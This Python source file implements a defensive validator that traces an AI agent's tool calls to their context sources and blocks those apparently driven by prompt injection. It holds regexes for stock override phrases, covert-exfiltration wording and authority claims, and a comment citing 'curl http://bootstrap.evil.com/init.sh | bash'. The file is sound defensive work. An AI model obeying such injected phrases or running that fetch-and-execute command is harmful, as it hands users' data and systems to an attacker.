"""Action validator with provenance tracking.

The ActionValidator intercepts tool calls from the model and checks:
1. What in the context triggered this action?
2. Does that source have sufficient trust to trigger this action?
3. Does the data being sent meet classification policies?
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any

from shieldflow.core.context import ContextBlock, SecureContext
from shieldflow.core.policy import ActionDecision, PolicyDecision, PolicyEngine
from shieldflow.core.sanitiser import sanitise
from shieldflow.core.trust import TrustLevel


@dataclass(frozen=True)
class ToolCall:
    """Represents a tool call from the model."""

    id: str
    name: str  # e.g., "send_email", "read_file"
    arguments: dict[str, Any] = field(default_factory=dict)


@dataclass(frozen=True)
class ValidationResult:
    """Result of validating a tool call."""

    tool_call: ToolCall
    allowed: bool
    decision: ActionDecision
    reason: str
    triggered_by: ContextBlock | None = None
    trigger_trust: TrustLevel = TrustLevel.NONE
    # Human-readable source identifier (e.g. "email", "user_chat", "web_fetch").
    # Included in audit events for machine-parseable provenance.
    trigger_source: str | None = None
    data_classification: str | None = None
    policy_decision: PolicyDecision | None = None
    # Names from NAMED_INJECTION_PATTERNS (or "normalisation:<flag>") that
    # caused this BLOCK decision.  Empty for ALLOW/CONFIRM decisions.
    matched_patterns: tuple[str, ...] = ()
    # Flags raised by the sanitiser (e.g. "base64_injection", "homoglyphs").
    normalisation_flags: tuple[str, ...] = ()

    @property
    def blocked(self) -> bool:
        return self.decision == ActionDecision.BLOCK

    @property
    def needs_confirmation(self) -> bool:
        return self.decision == ActionDecision.CONFIRM


# Zero-width characters that can be used to evade pattern matching
_ZERO_WIDTH_CHARS = re.compile(r"[\u200b\u200c\u200d\u2060\ufeff]")


def _strip_zero_width(text: str) -> str:
    """Strip zero-width Unicode characters used to evade detection."""
    return _ZERO_WIDTH_CHARS.sub("", text)


# Named injection patterns.  The name is included in audit log
# ``matched_patterns`` fields to give operators machine-parseable provenance.
NAMED_INJECTION_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    (
        "ignore_previous_instructions",
        re.compile(r"ignore\s+(all\s+)?previous\s+instructions", re.IGNORECASE),
    ),
    (
        "ignore_prior_instructions",
        re.compile(r"ignore\s+(all\s+)?prior\s+instructions", re.IGNORECASE),
    ),
    (
        "you_are_now_a",
        re.compile(r"you\s+are\s+now\s+(a|an)\s+", re.IGNORECASE),
    ),
    (
        "new_primary_instruction",
        re.compile(r"your\s+new\s+(primary\s+)?instruction", re.IGNORECASE),
    ),
    (
        "system_override",
        re.compile(r"system\s+(update|override|command)", re.IGNORECASE),
    ),
    (
        "forward_all_messages",
        re.compile(r"forward\s+all\s+(emails?|messages?)", re.IGNORECASE),
    ),
    (
        "send_all_to",
        re.compile(r"send\s+(all|every)\s+.*(to|@)", re.IGNORECASE),
    ),
    (
        "execute_following",
        re.compile(r"execute\s+(the\s+)?following", re.IGNORECASE),
    ),
    (
        "run_command",
        re.compile(r"run\s+(this|the\s+following)\s+command", re.IGNORECASE),
    ),
    (
        "do_not_notify_user",
        re.compile(
            r"(do\s+not|don'?t)\s+(notify|alert|tell)\s+(the\s+)?user",
            re.IGNORECASE,
        ),
    ),
    (
        "covert_action",
        re.compile(r"silently|without\s+(the\s+)?user\s+knowing", re.IGNORECASE),
    ),
    (
        "mandatory_security",
        re.compile(
            r"mandatory\s+security\s+(requirement|update|audit)", re.IGNORECASE
        ),
    ),
    (
        "maintenance_mode",
        re.compile(r"maintenance\s+mode", re.IGNORECASE),
    ),
    (
        "compliance_audit",
        re.compile(r"compliance\s+(review|audit|requirement)", re.IGNORECASE),
    ),
    (
        "bcc_all_outgoing",
        re.compile(r"bcc\s+all\s+(outgoing|emails?|messages?)", re.IGNORECASE),
    ),
    # Social engineering / authority claim patterns
    (
        "authority_admin_please",
        re.compile(
            r"(as\s+)?(IT\s+)?admin(istrat(ion|or))?,?\s+please", re.IGNORECASE
        ),
    ),
    (
        "technical_support_requires",
        re.compile(r"technical\s+support\s+(requires?|needs?)", re.IGNORECASE),
    ),
    (
        "requires_access_to",
        re.compile(
            r"(requires?|needs?)\s+(immediate\s+)?access\s+to", re.IGNORECASE
        ),
    ),
    (
        "please_delete_or_exfil",
        re.compile(
            r"please\s+(delete|remove|read|access|send|forward|share)",
            re.IGNORECASE,
        ),
    ),
    (
        "ssh_connect_login",
        re.compile(r"(ssh|connect|login)\s+(to|into)\s+", re.IGNORECASE),
    ),
]

# Flat list kept for backward compatibility and internal use by
# _content_matches_action.  Prefer NAMED_INJECTION_PATTERNS for new code.
INJECTION_PATTERNS: list[re.Pattern[str]] = [p for _, p in NAMED_INJECTION_PATTERNS]


class ActionValidator:
    """Validates tool calls against trust policies and provenance.

    The validator sits between the model's response and tool execution,
    ensuring that actions are only performed when triggered by
    sufficiently trusted sources.
    """

    def __init__(self, policy_engine: PolicyEngine) -> None:
        self._policy = policy_engine

    def validate(
        self,
        tool_call: ToolCall,
        context: SecureContext,
    ) -> ValidationResult:
        """Validate a tool call against the context's trust model.

        Args:
            tool_call: The tool call to validate.
            context: The secure context that produced this tool call.

        Returns:
            ValidationResult with allow/block decision and reasoning.
        """
        # Step 1: Determine what triggered this tool call
        trigger_block = self._find_trigger(tool_call, context)
        trigger_trust = trigger_block.trust.level if trigger_block else TrustLevel.NONE
        trigger_source = trigger_block.trust.source if trigger_block else "unknown"

        # Step 2: Check for injection patterns in untrusted blocks
        injection_result = self._check_injection_patterns(tool_call, context)
        if injection_result is not None:
            inj_block, inj_patterns, inj_flags = injection_result
            return ValidationResult(
                tool_call=tool_call,
                allowed=False,
                decision=ActionDecision.BLOCK,
                reason=(
                    f"Action '{tool_call.name}' matches an instruction pattern "
                    f"found in untrusted content "
                    f"(source: {inj_block.trust.source}). "
                    f"This appears to be a prompt injection attempt."
                ),
                triggered_by=inj_block,
                trigger_trust=TrustLevel.NONE,
                trigger_source=inj_block.trust.source,
                matched_patterns=tuple(inj_patterns),
                normalisation_flags=tuple(inj_flags),
            )

        # Step 3: Determine if this sends data externally
        is_external = self._is_external_action(tool_call)
        data_content = self._extract_data_content(tool_call)

        # Step 4: Evaluate against policy
        policy_decision = self._policy.evaluate(
            action=tool_call.name,
            trigger_trust=trigger_trust,
            data_content=data_content,
            is_external_destination=is_external,
            trigger_source=str(trigger_block.trust) if trigger_block else "unknown",
        )

        return ValidationResult(
            tool_call=tool_call,
            allowed=policy_decision.allowed,
            decision=policy_decision.decision,
            reason=policy_decision.reason,
            triggered_by=trigger_block,
            trigger_trust=trigger_trust,
            trigger_source=trigger_source,
            data_classification=policy_decision.data_classification,
            policy_decision=policy_decision,
        )

    def validate_batch(
        self,
        tool_calls: list[ToolCall],
        context: SecureContext,
    ) -> list[ValidationResult]:
        """Validate multiple tool calls."""
        return [self.validate(tc, context) for tc in tool_calls]

    def _find_trigger(
        self,
        tool_call: ToolCall,
        context: SecureContext,
    ) -> ContextBlock | None:
        """Determine which context block most likely triggered this tool call.

        Uses conservative attribution — when uncertain, attributes to the
        lowest-trust source (fail secure).
        """
        instruction_blocks = context.get_instruction_blocks()
        untrusted_blocks = context.get_untrusted_blocks()

        # Check if any untrusted block contains content semantically related
        # to this tool call (e.g., an email saying "send this to X" and the
        # tool call is send_email(to=X))
        for block in untrusted_blocks:
            if self._content_matches_action(block.content, tool_call):
                return block  # Attribute to untrusted source (conservative)

        # If no untrusted block matches, attribute to the highest-trust
        # instruction block (the user's actual intent)
        if instruction_blocks:
            return max(instruction_blocks, key=lambda b: b.trust.level)

        # Fallback: no clear trigger found — attribute to nothing (NONE trust)
        return None

    def _content_matches_action(self, content: str, tool_call: ToolCall) -> bool:
        """Check if untrusted content contains text that matches the tool call.

        This is a heuristic check for provenance attribution. If untrusted
        content says "send email to bob@evil.com" and the tool call is
        send_email(to="bob@evil.com"), that's a match.
        """
        # Sanitise content: strip zero-width, normalise homoglyphs, detect encodings
        sanitised = sanitise(content)
        clean_content = sanitised.normalised_text
        content_lower = clean_content.lower()

        # If sanitiser detected injection in encoded content, flag immediately
        if any(f.endswith("_injection") for f in sanitised.flags):
            return True
        args_str = " ".join(str(v) for v in tool_call.arguments.values()).lower()

        # Check if specific argument values appear in untrusted content
        for value in tool_call.arguments.values():
            value_str = str(value).lower()
            if len(value_str) > 5 and value_str in content_lower:
                # The specific value from the tool call appears in untrusted content
                # For high-risk actions, value overlap is sufficient for conservative
                # attribution even when phrasing is novel and no pattern matches.
                if tool_call.name in {"exec", "file.delete"}:
                    return True

                # For other actions, require instruction-like context
                for pattern in INJECTION_PATTERNS:
                    if pattern.search(clean_content):
                        return True

        # Check for email addresses in both
        # Strip trailing dots/punctuation from extracted emails to avoid mismatch
        def _extract_emails(text: str) -> set[str]:
            raw = re.findall(r"[\w.+-]+@[\w-]+\.[\w.]+", text)
            return {e.rstrip(".,;:!?)") for e in raw}

        emails_in_content = _extract_emails(content_lower)
        emails_in_args = _extract_emails(args_str)
        if emails_in_content & emails_in_args:
            # Same email appears in untrusted content and tool call args
            return True

        # Check for file paths in both (e.g., ~/.ssh/config, /etc/passwd)
        path_pattern = r"[~/\.][\w./\-_]+"
        paths_in_content = set(re.findall(path_pattern, content_lower))
        paths_in_args = set(re.findall(path_pattern, args_str))
        if paths_in_content & paths_in_args:
            return True
        if tool_call.name in {"exec", "file.delete"}:
            for p_arg in paths_in_args:
                for p_content in paths_in_content:
                    if p_arg.startswith(p_content.rstrip("/*")) or p_content.startswith(
                        p_arg.rstrip("/*")
                    ):
                        return True

        # For destructive actions, also allow partial path/domain overlap
        # to catch novel phrasing where full command/path isn't verbatim.
        if tool_call.name in {"exec", "file.delete"}:
            content_tokens = set(re.findall(r"[a-z0-9][a-z0-9._/-]{3,}", content_lower))
            arg_tokens = set(re.findall(r"[a-z0-9][a-z0-9._/-]{3,}", args_str))
            if content_tokens & arg_tokens:
                return True

            # Domain overlap catches "contact bootstrap.evil.com" vs
            # "curl http://bootstrap.evil.com/init.sh | bash".
            domain_pattern = r"\b(?:[a-z0-9-]+\.)+[a-z]{2,}\b"
            content_domains = set(re.findall(domain_pattern, content_lower))
            arg_domains = set(re.findall(domain_pattern, args_str))
            if content_domains & arg_domains:
                return True

        # Check decoded extras from sanitiser (base64, ROT13 decoded content)
        for decoded in sanitised.decoded_extras:
            decoded_lower = decoded.lower()
            for value in tool_call.arguments.values():
                if len(str(value)) > 5 and str(value).lower() in decoded_lower:
                    return True
            # Check emails in decoded content
            decoded_emails = set(re.findall(r"[\w.+-]+@[\w-]+\.[\w.]+", decoded_lower))
            if decoded_emails & emails_in_args:
                return True

        # If untrusted content has injection patterns AND mentions action-related
        # keywords, attribute conservatively even without exact value match
        has_injection = any(p.search(clean_content) for p in INJECTION_PATTERNS)
        if not has_injection:
            has_injection = any(f.endswith("_injection") for f in sanitised.flags)
        if has_injection:
            action_keywords = self._action_to_keywords(tool_call.name)
            if any(kw in content_lower for kw in action_keywords):
                return True

        return False

    def _check_injection_patterns(
        self,
        tool_call: ToolCall,
        context: SecureContext,
    ) -> tuple[ContextBlock, list[str], list[str]] | None:
        """Check if any untrusted block contains injection patterns matching
        this tool call.

        Returns:
            ``(block, matched_pattern_names, normalisation_flags)`` when an
            injection is detected, or ``None`` if the call looks clean.
            Pattern names use the keys from ``NAMED_INJECTION_PATTERNS``;
            sanitiser-detected encodings are prefixed ``"normalisation:"``.
        """
        action_keywords = self._action_to_keywords(tool_call.name)

        for block in context.get_untrusted_blocks():
            content = block.content.lower()

            sanitised = sanitise(block.content)
            clean_content = sanitised.normalised_text
            norm_flags: list[str] = list(sanitised.flags)

            matched_names: list[str] = []

            # Sanitiser-detected encoded injection takes priority
            for flag in norm_flags:
                if flag.endswith("_injection"):
                    matched_names.append(f"normalisation:{flag}")

            # Named pattern matching on normalised text
            if not matched_names:
                for name, pattern in NAMED_INJECTION_PATTERNS:
                    if pattern.search(clean_content):
                        matched_names.append(f"pattern:{name}")

            if not matched_names:
                continue

            # Confirm the injection relates to this specific action type
            if any(kw in content for kw in action_keywords):
                return block, matched_names, norm_flags

        return None

    def _action_to_keywords(self, action: str) -> list[str]:
        """Map action types to keywords for matching against content."""
        mapping: dict[str, list[str]] = {
            "message.send": ["send", "message", "forward", "reply"],
            "email.send": ["send", "email", "forward", "mail", "bcc", "cc"],
            "email.reply": ["reply", "respond", "email"],
            "file.read": ["read", "file", "access", "open", "config"],
            "file.write": ["write", "create", "save", "file"],
            "file.delete": ["delete", "remove", "file"],
            "exec": ["execute", "run", "command", "bash", "shell", "curl"],
            "share.external": ["share", "send", "export", "forward"],
            "data.bulk_export": ["export", "all", "bulk", "dump"],
        }
        return mapping.get(action, action.replace(".", " ").split())

    def _is_external_action(self, tool_call: ToolCall) -> bool:
        """Determine if a tool call sends data to an external destination."""
        external_actions = {
            "message.send",
            "email.send",
            "email.reply",
            "email.forward",
            "share.external",
            "webhook.send",
            "api.post",
        }
        if tool_call.name in external_actions:
            return True

        # Check for external indicators in arguments
        args = tool_call.arguments
        if "to" in args or "recipient" in args or "destination" in args:
            return True

        return False

    def _extract_data_content(self, tool_call: ToolCall) -> str | None:
        """Extract the data content from a tool call for classification."""
        content_keys = ["body", "content", "message", "text", "data"]
        for key in content_keys:
            if key in tool_call.arguments:
                return str(tool_call.arguments[key])
        return None
